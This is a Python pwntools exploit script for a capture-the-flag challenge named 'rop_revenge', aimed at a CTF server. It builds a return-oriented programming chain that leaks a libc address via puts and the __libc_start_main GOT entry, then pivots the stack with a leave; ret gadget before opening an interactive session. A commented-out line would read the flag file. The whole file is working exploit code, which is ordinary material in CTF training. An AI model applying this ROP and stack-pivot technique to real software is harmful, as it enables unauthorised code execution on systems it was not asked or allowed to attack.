#!/usr/bin/env python
from pwn import *

# 

context.arch = 'amd64'

e , l = ELF('./rop_revenge') , ELF('./libc.so.6')

host , port = 'ctf.yuawn.idv.tw' , 10109
#host , port = '192.168.78.135' , 4000
y = remote( host , port )

name = 0x601080
main = 0x400636
pop_rdi = 0x400743
pop_rbp = 0x4005a0
leave_ret = 0x4006d1

p = flat(
    pop_rdi,
    e.got['__libc_start_main'],
    e.plt['puts'],
    pop_rbp,
    name + 0x200,
    0x400693
)

print hex(e.plt['puts']) , hex(e.got['__libc_start_main']) , len(p)

y.sendafter( '?' , p )

p = flat(
    'D' * 0x20,
    name - 8,
    leave_ret
)

y.sendafter( '?' , p )



#y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()